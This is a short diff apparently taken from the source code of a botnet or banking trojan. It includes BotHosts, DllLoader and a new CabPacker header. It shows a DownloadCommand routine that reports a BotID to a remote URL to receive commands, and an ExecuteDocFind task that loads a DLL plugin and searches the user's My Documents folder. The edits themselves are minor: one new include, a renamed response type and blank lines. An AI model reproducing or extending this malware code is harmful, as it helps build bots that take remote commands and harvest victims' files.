@@ -15,6 +15,7 @@
 #include "BotHosts.h"
 #include "Plugins.h"
 #include "DllLoader.h"
+#include "CabPacker.h"
 #include <shlobj.h>
 #include <shlwapi.h>
 
@@ -377,7 +378,7 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 	PStrings Fields = Strings::Create();
 	AddURLParam(Fields, "id", BotID.t_str());
 
-	THTTPResponse Response;
+	THTTPResponseRec Response;
 	ClearStruct(Response);
 
 	#ifdef CryptHTTPH
@@ -769,7 +770,9 @@ bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
 					func( 0, DLL_PROCESS_ATTACH, 0 );
 					DWORD dwWait = (DWORD)pWaitForSingleObject( hEvent, INFINITE );
 					pCloseHandle(hEvent);
+
 					func( 0, DLL_PROCESS_DETACH, 0 );
+
 					char path[MAX_PATH], tmpName[MAX_PATH];
 					pSHGetFolderPathA( 0, CSIDL_MYDOCUMENTS,  0, 0, path );
 					pPathAppendA( path, "search" );
